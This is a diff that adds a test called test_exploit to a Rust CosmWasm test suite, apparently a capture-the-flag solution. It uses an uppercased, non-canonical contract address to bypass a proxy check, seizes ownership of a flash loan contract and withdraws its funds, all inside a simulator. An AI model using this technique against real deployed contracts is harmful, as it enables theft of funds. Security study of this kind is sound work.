@@ -10,6 +10,8 @@ pub mod tests {
     use common::proxy::{ExecuteMsg, InstantiateMsg};
     use cosmwasm_std::{coin, to_binary, Addr, Empty, Uint128};
     use cw_multi_test::{App, Contract, ContractWrapper, Executor};
+    use cosmwasm_std::testing::MockApi;
+    use cosmwasm_std::Api;
 
     pub fn proxy_contract() -> Box<dyn Contract<Empty>> {
         let contract = ContractWrapper::new(
@@ -158,5 +160,54 @@ pub mod tests {
             .query_balance(flash_loan_contract.to_string(), DENOM)
             .unwrap();
         assert_eq!(balance.amount, Uint128::new(10_000));
+        
+    }
+
+    #[test]
+    fn test_exploit(){
+        /*
+        @note
+        •   get the non-normalized version of the flash loan contract address
+
+        •   Pass this to proxy::request_flash_loan as recipient, bypassing check
+            if recipient contract is the flash loan contract
+        •   call update_owner, which works because it does not canonicalize the address before
+            validating it
+        
+        •   Update owner to USER and then call withdraw(), which we can now call
+            because we are the flash loan contract owners
+        */
+        let mock_api = MockApi::default();
+
+        let (mut app, proxy_contract, flash_loan_contract, arb_contract) = proper_instantiate();
+        let flash_loan_uc = Addr::unchecked(flash_loan_contract.clone().into_string().to_uppercase());
+
+        let msg = FlashLoanExecuteMsg::TransferOwner{
+            new_owner: Addr::unchecked(USER)
+        };
+
+        app.execute_contract(
+            Addr::unchecked(USER),
+            proxy_contract.clone(),
+            &ExecuteMsg::RequestFlashLoan{
+                recipient: flash_loan_uc.clone(),
+                msg: to_binary(&msg).unwrap(),
+            },
+            &vec![]
+        ).unwrap();
+
+        //now that we are owner, withdraw funds
+        app.execute_contract(
+            Addr::unchecked(USER),
+            flash_loan_contract.clone(),
+            &FlashLoanExecuteMsg::WithdrawFunds{
+                recipient: Addr::unchecked(USER),
+            },
+            &vec![],
+        ).unwrap();
+
+        let new_bal = app.wrap().query_balance(USER, DENOM).unwrap();
+        println!("user balance: {:?}", &new_bal);
+        assert!(new_bal.amount > Uint128::zero());
     }
 }
